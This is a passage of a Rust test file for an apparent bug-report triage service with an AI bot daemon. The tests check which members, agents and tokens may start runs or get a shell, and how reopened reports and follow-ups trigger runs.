    let id = d.ts.store.viewer_of_grant(&c.grant_id()).unwrap().public_id;
    let (st, p, q) = (d.ts.store.clone(), id.clone(), d.qid.clone());
    tokio::task::spawn_blocking(move || {
        st.set_flags(&AuditCtx::DAEMON, &p, &[(Flag::Claxbot, true)])
            .unwrap();
        if member {
            st.set_member(&AuditCtx::DAEMON, &q, &p, Some(Role::Triage))
                .unwrap();
        }
    })
    .await
    .unwrap();
    (c, id)
}

#[tokio::test]
async fn a_member_and_their_agent_get_a_shell_and_an_agent_that_cannot_read_reports_does_not() {
    let turn = |i: &str| Turn::script(i, "Shell", TRY_SHELL);
    let d = Daemon::start(vec![
        turn("tu_1"),
        Turn::finish("a"),
        turn("tu_2"),
        Turn::finish("b"),
        turn("tu_3"),
        Turn::finish("c"),
        turn("tu_4"),
        Turn::finish("d"),
    ])
    .await;
    d.with(FakeWorkspace::default());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let (aid, tid) = (report["artifact"]["id"].as_str().unwrap(), id_of(&report));
    let (c, pat) = person(&d, "Pat", true).await;
    let (_, outsider) = person(&d, "Olu", false).await;
    let grant = c.grant_id();

    let run = d.run_for(&pat, None, aid, tid);
    d.ended(&run).await;
    assert_eq!(d.script_value(&run), json!("ran"), "a member");
    let run = d.run_for(&pat, Some(&grant), aid, tid);
    d.ended(&run).await;
    assert_eq!(d.script_value(&run), json!("ran"), "a member's agent");
    let run = d.run_for(&outsider, None, aid, tid);
    d.ended(&run).await;
    assert_eq!(
        d.script_value(&run),
        json!("shell_disabled"),
        "someone outside the queue"
    );

    let narrow = clax_core::rights::Rights::parse(&json!([
        {"type": "clax-artifacts", "actions": ["read"], "locations": ["*"]},
    ]))
    .unwrap();
    let (st, g) = (d.ts.store.clone(), grant.clone());
    tokio::task::spawn_blocking(move || {
        st.narrow_grant(&AuditCtx::DAEMON, &g, Some(narrow))
            .unwrap();
    })
    .await
    .unwrap();
    let run = d.run_for(&pat, Some(&grant), aid, tid);
    d.ended(&run).await;
    assert_eq!(
        d.script_value(&run),
        json!("shell_disabled"),
        "an agent whose grant does not read reports"
    );
}

#[tokio::test]
async fn a_member_revoked_during_a_run_loses_its_shell_at_the_next_command() {
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Shell", TRY_SHELL_TWICE),
        Turn::finish("done"),
    ])
    .await;
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let (aid, tid) = (report["artifact"]["id"].as_str().unwrap(), id_of(&report));
    let (_, pat) = person(&d, "Pat", true).await;
    d.with(RevokesAtFirstCommand {
        inner: FakeWorkspace::default(),
        store: d.ts.store.clone(),
        person: pat.clone(),
    });
    let run = d.run_for(&pat, None, aid, tid);
    d.ended(&run).await;
    assert_eq!(d.script_value(&run), json!("shell_disabled"));
}

#[tokio::test]
async fn a_queues_service_grant_and_reporter_token_start_no_run() {
    let d = Daemon::start(vec![]).await;
    d.with(FakeWorkspace::default());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let (aid, tid) = (report["artifact"]["id"].as_str().unwrap(), id_of(&report));
    let pq = "/api/bot/runs";
    let body = serde_json::to_vec(&json!({"thread_ids": [tid], "artifact_id": aid})).unwrap();

    let res = d
        .as_reporter(
            &r,
            reqwest::Method::POST,
            pq,
            Some("application/json"),
            body.clone(),
        )
        .await;
    assert!(res.status().is_client_error(), "{}", res.status());

    let sig = d.sign(&d.service_key, "POST", pq, &d.service_token, &body);
    let res =
        d.ts.client
            .post(format!("{}{pq}", d.ts.base))
            .header("authorization", format!("Clax-Queue {}", d.service_token))
            .header("clax-signature", sig)
            .header("content-type", "application/json")
            .body(body)
            .send()
            .await
            .unwrap();
    assert!(res.status().is_client_error(), "{}", res.status());
    assert!(d.ts.store.runs_for_thread(tid, 10).unwrap().is_empty());
}

/// A host of `d`'s that follows reports when asked, as a Worker's does, and
/// is listening, over a bus of its own: the daemon's listener hears nothing
/// of what it is told.
async fn asked_host(d: &Daemon, w: Option<Arc<dyn Workspace>>) -> clax_server::bot::ServerHost {
    let mut state = d.ts.state.clone();
    state.events = clax_core::EventBus::new();
    let host = clax_server::bot::ServerHost::new(state).follows_when_asked();
    let host = match w {
        Some(w) => host.with_workspace(w),
        None => host,
    };
    host.set_runs(d.ts.state.bot.runs.clone());
    host.start_waiting().await.unwrap();
    host
}

/// Tells `host`'s bus that report `tid` changed.
fn changed(d: &Daemon, host: &clax_server::bot::ServerHost, tid: &str) {
    host.state.events.publish(clax_core::Event::Report {
        queue_id: d.qid.clone(),
        report_id: tid.to_string(),
        state: State::Open,
        members: Vec::new(),
    });
}

#[tokio::test]
async fn a_host_that_is_asked_starts_a_reopens_run_when_asked_and_only_then() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![Turn::finish("Looked at it again.")]).await;
    let w: Arc<dyn Workspace> = Arc::new(FakeWorkspace::offering(Offer::CHANGE));
    let host = asked_host(&d, Some(w)).await;
    d.reopen_straight(&tid).await;
    changed(&d, &host, &tid);
    changed(&d, &host, &tid);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
    host.follow_reports().await;
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.woken_by, Some(WokenBy::Reopen));
    host.follow_reports().await;
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 2);
}

#[tokio::test]
async fn a_host_that_is_asked_holds_to_its_targets_offer() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![]).await;
    let w: Arc<dyn Workspace> = Arc::new(FakeWorkspace::offering(Offer::default()));
    let host = asked_host(&d, Some(w)).await;
    d.reopen_straight(&tid).await;
    changed(&d, &host, &tid);
    host.follow_reports().await;
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
}

#[tokio::test]
async fn a_host_that_is_asked_after_falling_behind_its_bus_looks_for_the_word_it_missed() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![Turn::finish("Looked at it again.")]).await;
    let w: Arc<dyn Workspace> = Arc::new(FakeWorkspace::offering(Offer::CHANGE));
    let host = asked_host(&d, Some(w)).await;
    d.reopen_straight(&tid).await;
    for _ in 0..=clax_core::EVENT_BUS_CAPACITY {
        changed(&d, &host, "no-such-report");
    }
    host.follow_reports().await;
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.woken_by, Some(WokenBy::Reopen));
}

#[tokio::test]
async fn a_host_with_no_workspace_follows_nothing_when_asked() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![]).await;
    let host = asked_host(&d, None).await;
    d.reopen_straight(&tid).await;
    changed(&d, &host, &tid);
    host.follow_reports().await;
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
}

#[tokio::test]
async fn a_held_fix_keeps_what_it_links_to_for_its_notice() {
    let (d, _r, tid, _run) = held_fix().await;
    let fixes = d.report(&tid).fixes;
    assert_eq!(fixes[0].fix.url, None, "the reporter's view holds neither");
    let links = d.ts.store.fix_links(&tid, fixes[0].n).unwrap().unwrap();
    assert_eq!(links.url.as_deref(), Some("https://forge.example/pr/1"));
    assert_eq!(links.commit.as_deref(), Some("abc"));
    assert_eq!(links.preview_step, None, "its target says nothing of one");
}

#[tokio::test]
async fn a_target_with_follow_ups_off_acknowledges_a_reply_and_no_word_starts_a_run() {
    let quiet = Offer {
        no_follow_ups: true,
        ..Offer::CHANGE.wake_on_reply()
    };
    let (d, r, _, tid) = fixed(quiet, vec![]).await;
    d.reply(&r, &tid, "Does it cover refunds?").await;
    assert_eq!(d.follow(&tid).await, None);
    let last = d.report(&tid).comments.last().unwrap().body.clone();
    assert_eq!(last, REPLY_RECEIVED);
    d.reopen(&r, &tid, "Still broken").await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
}
